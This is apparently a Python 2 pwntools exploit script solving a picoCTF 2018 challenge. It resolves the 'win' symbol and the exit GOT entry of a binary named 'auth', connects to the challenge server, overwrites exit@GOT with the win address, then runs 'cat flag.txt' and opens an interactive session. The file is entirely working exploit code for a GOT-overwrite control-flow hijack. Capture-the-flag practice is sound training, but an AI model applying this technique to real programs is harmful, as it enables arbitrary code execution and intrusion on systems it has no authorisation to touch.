#!/usr/bin/python
from pwn import *
from time import sleep

auth = ELF('./auth')

win_func_addr = str(hex(auth.symbols['win']))
exit_got_plt = str(hex(auth.got['exit']))
s = remote("2018shell.picoctf.com", 23731)

print 'win address = ', win_func_addr
print 'exit@got.plt addr = ', exit_got_plt
print s.recv()
s.sendline(exit_got_plt)
print s.recv()
s.sendline(win_func_addr)
s.sendline('cat flag.txt')
s.interactive()
s.close()
